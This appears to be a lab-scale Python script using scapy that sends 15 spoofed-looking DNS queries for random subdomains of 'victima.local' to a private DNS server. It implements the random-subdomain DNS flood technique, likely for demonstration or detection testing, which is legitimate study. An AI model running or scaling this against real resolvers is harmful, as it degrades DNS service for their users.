#!/usr/bin/env python3
from scapy.all import IP, UDP, DNS, DNSQR, send
import random, string, time

TARGET_DNS = "192.168.20.1"
DOMAIN = "victima.local"
NUM_QUERIES = 15

def random_subdomain():
    letters = string.ascii_lowercase
    rand_str = ''.join(random.choice(letters) for _ in range(8))
    return f"{rand_str}.{DOMAIN}"

if __name__ == "__main__":
    print(f"[*] Enviando {NUM_QUERIES} consultas DNS falsas a {TARGET_DNS}...")
    for i in range(NUM_QUERIES):
        sub = random_subdomain()
        pkt = IP(dst=TARGET_DNS) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=sub, qtype="A"))
        send(pkt, verbose=0)
        print(f"  [{i+1}/{NUM_QUERIES}] {sub}")
        time.sleep(0.2)
    print("[*] Finalizado.")
